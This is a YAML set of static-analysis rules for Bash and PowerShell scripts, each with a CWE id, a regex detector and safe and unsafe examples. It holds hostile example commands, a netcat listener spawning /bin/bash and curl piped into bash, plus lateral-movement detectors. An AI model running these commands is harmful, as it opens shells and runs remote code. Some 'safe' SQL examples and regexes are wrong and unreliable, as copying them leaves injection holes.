  pattern: \\\\.*\\(ADMIN\$|C\$|IPC\$)
note: 'PsExec and admin shares enable remote code execution for lateral movement.

  Attackers copy tools to admin shares and execute them remotely.


  Remediation:

  - Monitor admin share access

  - Restrict remote service creation

  - Implement network segmentation

  - Use MFA for privileged accounts

  - Monitor for suspicious remote execution

  '
---
id: powershell-cwe-94-winrm-lateral-movement
language: powershell
severity: warning
message: 'CWE-94: Windows Remote Management used for lateral movement'
tags:
- security
- lateral-movement
- CWE-94
- MITRE-T1021.006
rule:
  kind: command_invocation
  pattern: (wsman:|WSMan:\\|winrm.*invoke|Test-WSMan)
note: 'WinRM provides legitimate remote management that can be abused for lateral
  movement.

  Enables remote command execution and file transfer.


  Remediation:

  - Restrict WinRM access

  - Require HTTPS

  - Monitor remote commands

  - Implement network controls

  - Use JEA for restricted endpoints

  '
---
id: bash-cwe-078-unquoted-variable-in-command
language: bash
severity: error
message: 'CWE-78: Using unquoted variables in commands allows word splitting and glob
  expansion, potentially executing unintended commands'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: variable_expansion
  pattern: (command $variable|command ${variable})
note: 'Unquoted variables expand with word splitting and glob expansion. Always quote
  variables.

  Safe: command "$variable" or command "${variable}"

  Unsafe: command $variable or command ${variable}

  '
---
id: bash-cwe-078-backtick-command-substitution
language: bash
severity: error
message: 'CWE-78: Using backticks or $() with untrusted input can lead to command
  injection'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: command_substitution
  pattern: (`.*\$.*`|\$\(.*\$.*\))
note: 'Backticks are unsafe and allow unquoted variables to be evaluated. Use $()
  with proper quoting.

  Safe: result=$(grep -- "$pattern" file.txt)

  Unsafe: result=`grep $pattern file.txt`

  '
---
id: bash-cwe-078-command-injection-xargs
language: bash
severity: error
message: 'CWE-78: Using xargs without -0 or proper quoting can lead to command injection
  through crafted filenames'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: pipe_command
  pattern: (xargs\s+(?!.*-0)(?!.*--null)|find.*\|\s*xargs\s+(?!.*-0))
note: 'Filenames with spaces or special characters cause xargs to split them incorrectly.

  Safe: find . -name "*.txt" -print0 | xargs -0 rm

  Safe: find . -name "*.txt" -exec rm {} \;

  Unsafe: find . -name "*.txt" | xargs rm

  '
---
id: bash-cwe-078-find-exec-shell-injection
language: bash
severity: warning
message: 'CWE-78: Using find -exec with shell interpretation can be dangerous if paths
  are not sanitized'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: command_execution
  pattern: find.*-exec\s+(sh|bash)\s+-c
note: 'When using -exec sh/bash -c, the command string is evaluated by the shell.

  Safe: find . -exec sh -c ''process "$1"'' _ {} \;

  Safe: find . -exec process {} \;

  '
---
id: bash-cwe-134-printf-format-string-injection
language: bash
severity: error
message: 'CWE-134: Using user input as printf format string can lead to format string
  vulnerabilities'
tags:
- security
- format-string
- CWE-134
rule:
  kind: builtin_command
  pattern: (printf\s+\$|printf\s+"\$)
note: 'User input should never be passed as printf''s format string. Use %s format
  specifier instead.

  Safe: printf ''%s\n'' "$user_input"

  Unsafe: printf "$user_input"

  Unsafe: printf "$user_message"

  '
---
id: bash-cwe-078-indirect-variable-expansion
language: bash
severity: error
message: 'CWE-78: Indirect variable expansion (${!var}) with user input can execute
  arbitrary commands'
tags:
- security
- code-execution
- CWE-78
rule:
  kind: variable_expansion
  pattern: \$\{!.*\}
note: "Indirect expansion allows accessing arbitrary variables that could be dangerous.\n\
  Validate the variable name before using indirect expansion:\ncase \"$var_name\"\
  \ in\n    allowed_var1|allowed_var2) value=${!var_name} ;;\n    *) echo \"Invalid\
  \ variable\" >&2; exit 1 ;;\nesac\n"
---
id: bash-cwe-078-unquoted-array-expansion
language: bash
severity: error
message: 'CWE-78: Unquoted array expansion causes word splitting on each element'
tags:
- security
- variable-expansion
- CWE-78
rule:
  kind: array_expansion
  pattern: '\\$\\{[a-zA-Z_][a-zA-Z0-9_]*\\[@\\*\\]\\}(?![\"''])

    '
note: 'Arrays must be quoted to preserve elements with spaces.

  Safe: rm "${files[@]}"

  Unsafe: rm ${files[@]}

  Unsafe: rm ${files[*]}

  '
---
id: bash-cwe-078-ifs-manipulation-without-restore
language: bash
severity: warning
message: 'CWE-078: Modifying IFS without restoring can cause unexpected behavior in
  subsequent code'
tags:
- security
- variable-expansion
- CWE-078
rule:
  kind: variable_assignment
  pattern: IFS=.*(?!.*IFS=)
note: 'IFS modifications affect word splitting globally. Always restore it.

  Safe: old_ifs=$IFS; IFS=:; ...; IFS=$old_ifs

  Safe: (IFS=:; ...) # Use subshell for isolation

  '
---
id: bash-cwe-078-word-splitting-in-conditional
language: bash
severity: error
message: 'CWE-078: Unquoted variables in [ ] conditionals can cause syntax errors
  or incorrect results'
tags:
- security
- variable-expansion
- CWE-78
rule:
  kind: conditional
  pattern: (\[\s+\$[a-zA-Z_].*\]|\[\s+-[a-z]\s+\$[a-zA-Z_])
note: 'Variables in conditionals must be quoted. Alternatively, use [[ ]] which doesn''t
  word-split.

  Safe: if [ "$filename" = "test" ]; then

  Safe: if [[ $filename = "test" ]]; then

  Unsafe: if [ $filename = "test" ]; then

  '
---
id: bash-cwe-078-glob-expansion-in-variable
language: bash
severity: warning
message: 'CWE-078: Assigning glob patterns without quotes can expand to files'
tags:
- security
- variable-expansion
- CWE-78
rule:
  kind: variable_assignment
  pattern: '[a-zA-Z_][a-zA-Z0-9_]*=\*'
note: 'Glob patterns should be quoted to prevent immediate expansion.

  Safe: pattern=''*.txt''

  Safe: pattern="*.txt"

  Unsafe: pattern=*.txt

  '
---
id: bash-cwe-094-eval-with-user-input
language: bash
severity: error
message: 'CWE-94: Using eval with any user-controlled input is extremely dangerous'
tags:
- security
- code-execution
- CWE-94
rule:
  kind: builtin_command
  pattern: eval\s+.*\$
note: "Eval with user input enables arbitrary code execution. Avoid eval entirely.\n\
  If absolutely necessary, validate input strictly:\ncase \"$user_input\" in\n   \
  \ [a-zA-Z0-9_]*) eval \"$user_input\" ;;\n    *) echo \"Invalid input\" >&2; exit\
  \ 1 ;;\nesac\n"
---
id: bash-cwe-094-source-with-user-input
language: bash
severity: error
message: 'CWE-94: Sourcing files based on user input can execute arbitrary code'
tags:
- security
- code-execution
- CWE-94
rule:
  kind: builtin_command
  pattern: (source|\.)\s+\$
note: "Sourcing untrusted files enables arbitrary code execution.\nSafe approach:\
  \ validate path is in allowed directory:\nconfig_file=$(realpath -- \"$config_file\"\
  )\ncase \"$config_file\" in\n    /etc/myapp/*) source \"$config_file\" ;;\n    *)\
  \ echo \"Invalid config path\" >&2; exit 1 ;;\nesac\n"
---
id: bash-cwe-078-dynamic-command-construction
language: bash
severity: error
message: 'CWE-78: Building commands dynamically from user input enables injection'
tags:
- security
- code-execution
- CWE-78
rule:
  kind: command_construction
  pattern: (cmd=.*\$.*|\$cmd|\$\{cmd\})
note: "Dynamically constructed commands are prone to injection.\nSafe: Use arrays\
  \ for command construction:\ncmd=(ls -- \"$user_dir\")\n\"${cmd[@]}\"\n\nOr validate\
  \ input:\nif [[ \"$user_dir\" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then\n    ls -- \"$user_dir\"\
  \nfi\n"
---
id: bash-cwe-078-bash-c-with-concatenation
language: bash
severity: error
message: 'CWE-78: Using bash -c with string concatenation is injection-prone'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: command_execution
  pattern: '(bash|sh)\\s+-c\\s+[\"''].*\\$

    '
note: 'String concatenation in bash -c allows injection. Pass arguments instead.

  Safe: bash -c ''echo "$1"'' _ "$user_input"

  Safe: sh -c ''process "$1"'' _ "$filename"

  Unsafe: bash -c "echo $user_input"

  Unsafe: sh -c "process $filename"

  '
---
id: bash-cwe-094-alias-definition-from-user-input
language: bash
severity: error
message: 'CWE-94: Creating aliases from user input can define malicious commands'
tags:
- security
- code-execution
- CWE-94
rule:
  kind: builtin_command
  pattern: alias\s+.*=.*\$|alias\s+\$
note: 'Dynamic aliases are extremely dangerous. Validate strictly or avoid entirely.

  If necessary: if [[ "$alias_name" =~ ^[a-z][a-z0-9_]*$ ]]; then ...; fi

  '
---
id: bash-cwe-078-unsafe-glob-in-for-loop
language: bash
severity: error
message: 'CWE-78: Globbing in for loops fails with filenames containing spaces or
  special characters'
tags:
- security
- glob-injection
- CWE-78
rule:
  kind: loop_statement
  pattern: for\s+[a-zA-Z_][a-zA-Z0-9_]*\s+in\s+\*|for\s+[a-zA-Z_][a-zA-Z0-9_]*\s+in\s+\$\(ls
note: 'Globs don''t handle filenames with spaces properly. Use proper quoting and
  null delimiters.

  Safe: for file in *; do [ -e "$file" ] || continue; process "$file"; done

  Safe: while IFS= read -r -d '''' file; do process "$file"; done < <(find . -maxdepth
  1 -type f -print0)

  Unsafe: for file in $(ls); do process "$file"; done

  '
---
id: bash-cwe-078-filename-starting-with-dash
language: bash
severity: error
message: 'CWE-78: Files starting with - can be interpreted as command options'
tags:
- security
- glob-injection
- CWE-78
rule:
  kind: command_call
  pattern: (rm|mv|cp|cat)\s+\$(?!.*--)
note: 'Filenames starting with ''-'' are interpreted as options. Use -- to separate
  options from arguments.

  Safe: rm -- "$filename"

  Safe: cat -- "$filename"

  Safe: rm "./$filename"

  Unsafe: rm $filename

  Unsafe: cat $filename

  '
---
id: bash-cwe-078-nullglob-not-set
language: bash
severity: warning
message: 'CWE-78: Without nullglob, unmatched globs expand to the literal pattern'
tags:
- security
- glob-injection
- CWE-78
rule:
  kind: pattern_expansion
  pattern: for\s+.*\s+in\s+\*.*\;
note: 'Unmatched globs can be processed as literal strings. Enable nullglob or check
  existence.

  Safe: shopt -s nullglob; for f in /path/*.txt; do process "$f"; done; shopt -u nullglob

  Safe: for f in /path/*.txt; do [ -e "$f" ] || continue; process "$f"; done

  '
---
id: bash-cwe-078-unsafe-rm-with-glob
language: bash
severity: error
message: 'CWE-78: Using rm with variables that could expand to dangerous paths'
tags:
- security
- glob-injection
- CWE-78
rule:
  kind: dangerous_command
  pattern: rm\s+-rf?\s+\$[a-zA-Z_].*/|rm\s+-rf?\s+"\$[a-zA-Z_].*/
note: 'Empty variables in rm -rf can lead to deleting critical directories.

  Safe: if [ -z "$dir" ]; then echo "Error: dir is empty" >&2; exit 1; fi; rm -rf
  -- "$dir/"

  Safe: rm -rf -- "${dir:?Error: dir is empty}/"

  Unsafe: rm -rf $dir/ (if $dir is empty becomes "rm -rf /")

  '
---
id: bash-cwe-367-toctou-file-operations
language: bash
severity: warning
message: 'CWE-367: Time-of-check to time-of-use races when checking then operating
  on files'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: conditional
  pattern: (if\s+\[\s+-[ef]\s+.*\].*then.*rm|test\s+-[ef]\s+.*&&.*rm)
note: 'Files can be modified or replaced between the check and operation.

  Safe: rm -f "$file" (no check needed with -f flag)

  Safe: Use atomic operations with file locking

  '
---
id: bash-cwe-426-relative-path-entries
language: bash
severity: error
message: 'CWE-426: Relative entries in PATH (especially .) can lead to executing malicious
  binaries'
tags:
- security
- path-manipulation
- CWE-426
rule:
  kind: variable_assignment
  pattern: '(PATH=.*:\\.[:$]|PATH=\\.:.*|PATH=.*::.*|export\\s+PATH=.*\\.)

    '
note: 'Relative PATH entries, especially current directory, enable arbitrary code
  execution.

  Safe: PATH=/usr/local/bin:/usr/bin:/bin; export PATH

  Safe: Always use absolute paths for security-sensitive scripts: /usr/bin/command

  Unsafe: PATH=.:$PATH

  Unsafe: PATH=$PATH:.

  Unsafe: PATH=/usr/bin::/bin (empty entry = current dir)

  '
---
id: bash-cwe-426-unset-path
language: bash
severity: error
message: 'CWE-426: Unsetting PATH causes shell to search current directory'
tags:
- security
- path-manipulation
- CWE-426
rule:
  kind: variable_assignment
  pattern: '(unset\\s+PATH|PATH=\"\"|PATH='''')

    '
note: 'Unsetting PATH makes the shell search the current directory, which is dangerous.

  Safe: PATH=/usr/bin:/bin; export PATH

  '
---
id: bash-cwe-426-ld-preload-in-environment
language: bash
severity: error
message: 'CWE-426: LD_PRELOAD can inject malicious libraries into processes'
tags:
- security
- environment-injection
- CWE-426
rule:
  kind: variable_assignment
  pattern: (export\s+LD_PRELOAD|LD_PRELOAD=)
note: 'LD_PRELOAD enables library injection attacks. Clear it in security-sensitive
  scripts.

  Safe: unset LD_PRELOAD; unset LD_LIBRARY_PATH

  Safe: env -i PATH=/usr/bin:/bin /bin/bash -c ''command''

  Unsafe: export LD_PRELOAD=$user_lib

  '
---
id: bash-cwe-078-ifs-injection
language: bash
severity: error
message: 'CWE-78: Malicious IFS values can alter word splitting behavior'
tags:
- security
- environment-injection
- CWE-78
rule:
  kind: variable_initialization
  pattern: (?<!IFS=)^[^I]*[^S]*
note: 'IFS should be explicitly set at script start to prevent malicious manipulation.

  Safe: #!/bin/bash; IFS=$'' \t\n''

  Safe: #!/bin/bash; unset -v IFS

  And always quote variables: process "$var"

  '
---
id: bash-cwe-078-cdpath-injection
language: bash
severity: warning
message: 'CWE-78: CDPATH can cause cd to change to unexpected directories'
tags:
- security
- environment-injection
- CWE-78
rule:
  kind: command_call
  pattern: cd\s+[^/]
note: 'CDPATH can redirect cd to unintended directories.

  Safe: unset CDPATH; cd subdir

  Safe: cd /absolute/path/subdir

  Safe: cd ./subdir

  Unsafe: cd subdir (when CDPATH is set)

  '
---
id: bash-cve-2014-6271-shellshock-patterns
language: bash
severity: error
message: 'CVE-2014-6271 (Shellshock): Environment variables with function definitions
  can execute code'
tags:
- security
- environment-injection
- CVE-2014-6271
- CVE-2014-7169
rule:
  kind: variable_assignment
  pattern: '(export\\s+[A-Z_]+=''{0,1}\\s*\\(\\s*\\)\\s*{|[A-Z_]+=''{0,1}\\s*\\(\\s*\\)\\s*{.*})

    '
note: 'Shellshock allows code execution via environment variables. Ensure bash is
  updated.

  Never pass untrusted data as environment variables.

  Update bash to patch CVE-2014-6271 and CVE-2014-7169

  '
---
id: bash-cwe-377-predictable-temp-file-names
language: bash
severity: error
message: 'CWE-377: Predictable temporary file names enable symlink attacks'
tags:
- security
- temporary-files
- CWE-377
rule:
  kind: file_operation
  pattern: (/tmp/[a-zA-Z0-9_]+\.|/tmp/\$\$|/tmp/\$USER|tmpfile=/tmp/)
note: 'Predictable temp files are vulnerable to symlink attacks.

  Safe: tmpfile=$(mktemp); trap ''rm -f "$tmpfile"'' EXIT

  Safe: tmpdir=$(mktemp -d)

  Unsafe: tmpfile=/tmp/myapp.$$

  Unsafe: tmpfile=/tmp/output.txt

  '
---
id: bash-cwe-377-mktemp-without-check
language: bash
severity: warning
message: 'CWE-377: mktemp can fail; unchecked failure continues with empty variable'
tags:
- security
- temporary-files
- CWE-377
rule:
  kind: command_substitution
  pattern: tmpfile=\$\(mktemp\)(?!\s*\|\|)
note: 'mktemp failures must be checked. An empty $tmpfile can cause data loss.

  Safe: tmpfile=$(mktemp) || { echo "Failed to create temp file" >&2; exit 1; }

  Unsafe: tmpfile=$(mktemp); rm "$tmpfile"

  '
---
id: bash-cwe-459-temp-file-not-cleaned-up
language: bash
severity: info
message: 'CWE-459: Temporary files should be cleaned up on exit'
tags:
- security
- temporary-files
- CWE-459
rule:
  kind: process_lifecycle
  pattern: mktemp(?!.*trap.*rm)
note: 'Temp files left behind can leak sensitive data or consume disk space.

  Safe: tmpfile=$(mktemp) || exit 1; trap ''rm -f "$tmpfile"'' EXIT INT TERM

  '
---
id: bash-cwe-377-insecure-temp-directory-permissions
language: bash
severity: warning
message: 'CWE-377: Temp directories created without restrictive permissions'
tags:
- security
- temporary-files
- CWE-377
rule:
  kind: file_operation
  pattern: mkdir\s+/tmp/(?!.*-m\s*700)
note: 'World-readable temp directories are vulnerable to data exposure.

  Safe: tmpdir=$(mktemp -d)

  Safe: mkdir -m 700 /tmp/myapp.$$

  Unsafe: mkdir /tmp/myapp

  '
---
id: bash-cwe-250-suid-script
language: bash
severity: error
message: 'CWE-250: SUID on shell scripts is dangerous and mostly doesn''t work as
  expected'
tags:
- security
- privilege-escalation
- CWE-250
rule:
  kind: file_permission
  pattern: chmod\s+[0-7]*[4-7][0-7][0-7]\s|chmod\s+u\+s
note: 'SUID shell scripts are unreliable and dangerous.

  Safe: Use sudo instead of SUID scripts

  Safe: Create compiled wrappers if SUID is necessary

  Safe: Use capabilities: setcap cap_net_bind_service=+ep /path/to/binary

  Unsafe: chmod 4755 myscript.sh

  '
---
id: bash-cwe-250-sudo-with-user-input
language: bash
severity: error
message: 'CWE-250: Passing user input to sudo commands enables privilege escalation'
tags:
- security
- privilege-escalation
- CWE-250
rule:
  kind: command_execution
  pattern: sudo\s+.*\$|sudo\s+-u\s+\$
note: "User input to sudo enables arbitrary privilege escalation.\nSafe: Whitelist\
  \ allowed commands:\ncase \"$user_command\" in\n    restart|reload) sudo systemctl\
  \ \"$user_command\" myservice ;;\n    *) echo \"Command not allowed\" >&2; exit\
  \ 1 ;;\nesac\nUnsafe: sudo \"$user_command\"\n"
---
id: bash-cwe-732-world-writable-script
language: bash
severity: error
message: 'CWE-732: Scripts with world-writable permissions can be modified by any
  user'
tags:
- security
- permissions
- CWE-732
rule:
  kind: file_permission
  pattern: chmod\s+[0-7]*[0-7][2367]\s|chmod\s+.*o\+w|chmod\s+777
note: 'World-writable scripts enable arbitrary code injection.

  Safe: chmod 755 script.sh (rwxr-xr-x)

  Safe: chmod 700 script.sh (rwx------)

  Unsafe: chmod 777 script.sh

  Unsafe: chmod o+w script.sh

  '
---
id: bash-cwe-732-umask-not-set
language: bash
severity: warning
message: 'CWE-732: Default umask may create files with excessive permissions'
tags:
- security
- permissions
- CWE-732
rule:
  kind: file_operation
  pattern: (?<!umask).*>\s+[^|]
note: 'Scripts should set umask before creating files.

  Safe: #!/bin/bash; umask 077; echo "sensitive" > /etc/myapp/config

  Creates files with 600 permissions, directories with 700

  '
---
id: bash-cwe-250-running-as-root-without-check
language: bash
severity: warning
message: 'CWE-250: Scripts requiring root should verify they have appropriate privileges'
tags:
- security
- privilege-escalation
- CWE-250
rule:
  kind: root_command
  pattern: (systemctl|mount|fdisk|iptables)(?!.*EUID)
note: 'Scripts using root-only commands should check for root privileges.

  Safe: if [ "$EUID" -ne 0 ]; then echo "This script must be run as root" >&2; exit
  1; fi

  '
---
id: bash-cwe-494-curl-pipe-to-bash
language: bash
severity: error
message: 'CWE-494: Piping curl/wget output directly to shell is extremely dangerous'
tags:
- security
- insecure-download
- CWE-494
rule:
  kind: pipe_command
  pattern: curl.*\|\s*(ba)?sh|wget.*-O\s*-.*\|\s*(ba)?sh|curl.*\|\s*sudo\s+(ba)?sh
note: "Piped downloads skip integrity checks and allow MITM attacks.\nSafe: curl -fsSL\
  \ https://example.com/script.sh -o script.sh\n      less script.sh # Inspect\n \
  \     sha256sum script.sh # Verify\n      bash script.sh # Then execute\nUnsafe:\
  \ curl http://example.com/script.sh | bash\nUnsafe: curl https://example.com/install\
  \ | sudo bash\n"
---
id: bash-cwe-295-http-without-tls
language: bash
severity: error
message: 'CWE-295: Downloading over HTTP allows MITM attacks'
tags:
- security
- insecure-download
- CWE-295
rule:
  kind: command_call
  pattern: (curl|wget)\s+http://
note: 'HTTP is unencrypted and vulnerable to MITM. Always use HTTPS.

  Safe: curl https://example.com/data

  Safe: wget https://example.com/file

  Unsafe: curl http://example.com/data

  Unsafe: wget http://example.com/file

  '
---
id: bash-cwe-295-disabled-certificate-verification
language: bash
severity: error
message: 'CWE-295: Disabling SSL certificate verification enables MITM attacks'
tags:
- security
- network-security
- CWE-295
rule:
  kind: command_call
  pattern: curl.*-k|curl.*--insecure|wget.*--no-check-certificate
note: 'Disabling certificate verification defeats TLS security.

  Safe: curl https://example.com/api

  Safe: If using self-signed cert: curl --cacert /path/to/ca.crt https://example.com/api

  Unsafe: curl -k https://example.com/api

  Unsafe: wget --no-check-certificate https://example.com/file

  '
---
id: bash-cwe-200-netcat-listener
language: bash
severity: error
message: 'CWE-200: Netcat listeners can expose system to remote attacks'
tags:
- security
- network-security
- CWE-200
rule:
  kind: command_call
  pattern: (nc|netcat|ncat)\s+-l
note: 'Netcat listeners (especially with -e) create backdoors.

  Safe: nc -l 127.0.0.1 8080 (bind to localhost only)

  Unsafe: nc -l -p 8080 -e /bin/bash

  Avoid: Using -e flag for code execution

  '
---
id: bash-cwe-214-password-in-command-line
language: bash
severity: error
message: 'CWE-214: Passwords in command line are visible in process list'
tags:
- security
- credential-exposure
- CWE-214
rule:
  kind: command_call
  pattern: '(-p\\s*[''\"]?[^''\"$\\s]+[''\"]?|--password[=\\s][''\"]?[^''\"$\\s]+|mysql.*-p[^$\\s])

    '
note: 'Command-line passwords are visible in ps output and shell history.

  Safe: export MYSQL_PWD="$password"; mysql -u root

  Safe: curl -n https://example.com (uses .netrc)

  Safe: ssh -i ~/.ssh/key user@host

  Safe: mysql -u root -p (password prompted)

  Unsafe: mysql -u root -pSecretPass

  Unsafe: curl -u user:password https://api.example.com

  '
---
id: bash-cwe-798-hardcoded-credentials
language: bash
severity: error
message: 'CWE-798: Credentials hardcoded in scripts are easily discovered'
tags:
- security
- credential-exposure
- CWE-798
rule:
  kind: variable_assignment
  pattern: '(password\\s*=\\s*[''\"][^$''\"]+[''\"]|PASSWORD\\s*=\\s*[''\"][^$''\"]+[''\"]|api_key\\s*=\\s*[''\"][^$''\"]+[''\"]|secret\\s*=\\s*[''\"][^$''\"]+[''\"]|token\\s*=\\s*[''\"][^$''\"]+[''\"])

    '
note: 'Hardcoded credentials are discoverable in source control and files.

  Safe: password=$(cat /etc/myapp/secrets/password)

  Safe: API_KEY="${API_KEY:?API_KEY not set}"

  Safe: password=$(vault read -field=password secret/myapp)

  Unsafe: password="MySecretPass123"

  Unsafe: API_KEY="sk-1234567890abcdef"

  '
---
id: bash-cwe-522-ssh-key-without-passphrase
language: bash
severity: warning
message: 'CWE-522: SSH keys without passphrases are easily stolen'
tags:
- security
- credential-handling
- CWE-522
rule:
  kind: command_call
  pattern: 'ssh-keygen.*-N\\s*[''\"]?[''\"]?

    '
note: 'SSH keys should be protected with passphrases.

  Safe: ssh-keygen -t ed25519 (prompted for passphrase)

  Safe: Store in SSH agent: eval $(ssh-agent); ssh-add

  Unsafe: ssh-keygen -t rsa -N ""

  '
---
id: bash-cwe-532-credential-in-variable-name
language: bash
severity: warning
message: 'CWE-532: Credentials stored in variables may be logged or exposed'
tags:
- security
- credential-exposure
- CWE-532
rule:
  kind: echo_command
  pattern: (echo.*\$.*password|echo.*\$.*PASSWORD|echo.*\$.*secret|echo.*\$.*token|printf.*\$.*password)
note: 'Echoing credential variables exposes them in logs and terminal history.

  Safe: echo "Password is: ***" (don''t echo the actual value)

  Safe: logger "Authentication attempt for $user" (log user, not password)

  Unsafe: echo "Password is: $password"

  Unsafe: echo "DEBUG: token=$token"

  '
---
id: bash-cwe-798-aws-credentials-in-script
language: bash
severity: error
message: 'CWE-798: AWS credentials hardcoded in scripts'
tags:
- security
- credential-exposure
- CWE-798
rule:
  kind: variable_assignment
  pattern: '(AWS_ACCESS_KEY_ID\\s*=\\s*[''\"]?[A-Z0-9]{20}[''\"]?|AWS_SECRET_ACCESS_KEY\\s*=\\s*[''\"]?[A-Za-z0-9/+=]{40}[''\"]?|AKIA[0-9A-Z]{16})

    '
note: 'AWS credentials in scripts are easily compromised.

  Safe: Use ~/.aws/credentials file

  Safe: Use AWS instance profiles/roles

  Safe: Use AWS Secrets Manager: aws secretsmanager get-secret-value --secret-id myapp/prod

  Unsafe: export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"

  Unsafe: export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

  '
---
id: bash-cwe-020-unvalidated-user-input
language: bash
severity: error
message: 'CWE-20: Using command-line arguments without validation'
tags:
- security
- input-validation
- CWE-20
rule:
  kind: variable_usage
  pattern: (\$1(?!\s*:)|\$@(?!.*[@"])|\$\*|\$\{1\}(?!:))
note: 'Command-line arguments should be validated before use.

  Safe: file="${1:?Usage: $0 <filename>}"

  Safe: Validate content: if [[ ! "$file" =~ ^[a-zA-Z0-9._/-]+$ ]]; then ...

  Safe: Check existence: if [ ! -f "$file" ]; then ...

  Unsafe: file=$1; rm "$file"

  '
---
id: bash-cwe-078-read-without-ifs-reset
language: bash
severity: warning
message: 'CWE-78: Read can be affected by malicious IFS settings'
tags:
- security
- input-validation
- CWE-78
rule:
  kind: builtin_command
  pattern: read\s+(?!.*IFS)
note: 'Read should be protected against IFS manipulation and backslash interpretation.

  Safe: IFS= read -r user_input

  Explanation: -r prevents backslash interpretation, IFS= preserves whitespace

  '
---
id: bash-cwe-078-printf-without-format-specifier
language: bash
severity: warning
message: 'CWE-78: Using user input in printf without format specifier'
tags:
- security
- input-validation
- CWE-78
rule:
  kind: builtin_command
  pattern: 'printf\\s+[\"'']\\$|printf\\s+\\$

    '
note: 'User input must use %s format specifier to prevent format string attacks.

  Safe: printf ''%s'' "$user_input"

  Safe: printf ''%s\n'' "$user_input"

  Unsafe: printf "$user_input"

  '
---
id: bash-cwe-400-missing-input-length-check
language: bash
severity: info
message: 'CWE-400: Very long input can cause issues or denial of service'
tags:
- security
- input-validation
- CWE-400
rule:
  kind: builtin_command
  pattern: read.*(?!.*-n)
note: 'Long input can cause memory issues or DoS.

  Safe: read -r -n 1000 user_input

  Safe: Validate length: if [ ${#user_input} -gt 1000 ]; then echo "Input too long"
  >&2; exit 1; fi

  '
---
id: bash-cwe-117-log-injection-via-user-input
language: bash
severity: warning
message: 'CWE-117: User input in logs can inject fake log entries or control characters'
tags:
- security
- log-injection
- CWE-117
rule:
  kind: command_call
  pattern: (logger.*\$|echo.*>>\s*.*log.*\$)
note: 'User input in logs can inject newlines and fake entries.

  Safe: safe_username=${username//[$''\n\r'']/}; logger "User login: $safe_username"

  Safe: logger -t myapp --id=$$ "event=login user=$safe_username"

  Unsafe: logger "User login: $username"

  Unsafe: echo "$(date) $user_action" >> /var/log/app.log

  '
---
id: bash-cwe-150-terminal-escape-injection
language: bash
severity: warning
message: 'CWE-150: Untrusted data with escape sequences can manipulate terminal'
tags:
- security
- log-injection
- CWE-150
rule:
  kind: echo_command
  pattern: (echo\s+-e.*\$|printf.*\\e.*\$|cat\s+\$)
note: 'Escape sequences in output can manipulate terminal behavior.

  Safe: echo "$user_data" (no -e flag)

  Safe: printf ''%s\n'' "$user_data"

  Safe: Filter escapes: safe_data=$(echo "$user_data" | sed ''s/\x1b//g'')

  Unsafe: echo -e "$user_data"

  '
---
id: bash-cwe-532-history-file-exposure
language: bash
severity: warning
message: 'CWE-532: Shell history can contain sensitive commands'
tags:
- security
- information-exposure
- CWE-532
rule:
  kind: shell_option
  pattern: (HISTFILE=|export\s+HISTFILE)
note: 'Shell history can leak sensitive commands and credentials.

  Safe: set +o history; [sensitive commands]; set -o history

  Safe: unset HISTFILE

  Safe: Prefix with space: (HISTCONTROL=ignorespace) " mysql -u root -p"

  '
---
id: bash-cwe-489-debug-mode-in-production
language: bash
severity: warning
message: 'CWE-489: set -x in production scripts exposes commands and variables'
tags:
- security
- information-exposure
- CWE-489
rule:
  kind: shell_option
  pattern: set\s+-x|set\s+.*x.*[^+]
note: 'Debug mode exposes all variables including passwords in output.

  Safe: if [ "$DEBUG" = "true" ]; then set -x; fi

  Unsafe: #!/bin/bash; set -x; password="secret"; curl -u user:$password

  '
---
id: bash-cwe-754-trap-not-reset
language: bash
severity: info
message: 'CWE-754: Inherited traps can cause unexpected behavior'
tags:
- security
- signal-handling
- CWE-754
rule:
  kind: shebang_line
  pattern: ^#!.*(?!.*trap)
note: 'Scripts inherit traps from parent shell. Reset them explicitly.

  Safe: #!/bin/bash; trap - EXIT INT TERM; trap ''cleanup'' EXIT

  '
---
id: bash-cwe-528-core-dump-enabled
language: bash
severity: warning
message: 'CWE-528: Core dumps can contain sensitive data'
tags:
- security
- information-exposure
- CWE-528
rule:
  kind: ulimit_command
  pattern: ulimit\s+-c\s+[^0]|ulimit\s+-c\s+unlimited
note: 'Core dumps can leak passwords and sensitive data.

  Safe: ulimit -c 0

  Safe: Configure system: /etc/security/limits.conf

  Unsafe: ulimit -c unlimited

  '
---
id: bash-cwe-362-unsafe-process-substitution
language: bash
severity: warning
message: 'CWE-362: Process substitution creates temporary named pipes that could be
  hijacked'
tags:
- security
- race-condition
- CWE-362
rule:
  kind: process_substitution
  pattern: (<\(.*sensitive|>\(.*sensitive)
note: 'Process substitution can be vulnerable to TOCTOU attacks.

  Safe: Use regular temp files: tmpfile=$(mktemp); cat /etc/shadow > "$tmpfile"; ...

  Unsafe: diff <(cat /etc/shadow) <(cat /etc/shadow.bak)

  '
---
id: bash-cwe-089-sql-injection-in-shell
language: bash
severity: error
message: 'CWE-89: Building SQL queries with shell variables'
tags:
- security
- injection
- CWE-89
rule:
  kind: command_call
  pattern: '(mysql.*-e\\s+[\"''].*\\$|psql.*-c\\s+[\"''].*\\$|sqlite3.*[\"''].*\\$.*SELECT|INSERT|UPDATE|DELETE)

    '
note: 'SQL queries with unescaped variables enable SQL injection.

  Safe: Use parameterized queries if available

  Safe: mysql -e "SELECT * FROM users WHERE name=?" -s "$username"

  Safe: safe_username=$(mysql -e "SELECT QUOTE(''$username'')" -s)

  Unsafe: mysql -e "SELECT * FROM users WHERE name=''$username''"

  '
---
id: bash-cwe-090-ldap-injection
language: bash
severity: error
message: 'CWE-90: LDAP queries with unescaped user input'
tags:
- security
- injection
- CWE-90
rule:
  kind: command_call
  pattern: ldapsearch.*\$
note: 'LDAP special characters must be escaped.

  Safe: safe_username=$(echo "$username" | sed ''s/[\\*()]/\\&/g''); ldapsearch -b
  "dc=example,dc=com" "(uid=$safe_username)"

  Unsafe: ldapsearch -b "dc=example,dc=com" "(uid=$username)"

  '
---
id: bash-cwe-091-xml-injection
language: bash
severity: warning
